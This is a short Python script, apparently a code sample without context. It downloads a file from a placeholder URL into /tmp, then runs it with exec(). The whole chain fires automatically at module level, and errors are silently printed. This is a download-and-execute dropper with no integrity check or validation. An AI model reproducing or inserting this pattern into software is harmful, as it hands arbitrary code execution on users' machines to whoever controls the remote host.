import urllib.request
import os

def get_random_url():
    return "http://another-random-url.com/code.py"

def download_and_save(url, local_file):
    urllib.request.urlretrieve(url, local_file)

def run_code_from_file(local_file):
    try:
        with open(local_file, "r") as f:
            code = f.read()
        exec(code)
    except Exception as e:
        print(e)

def main_func():
    random_url = get_random_url()
    local_file = "/tmp/code.py"
    
    download_and_save(random_url, local_file)
    run_code_from_file(local_file)

main_func()
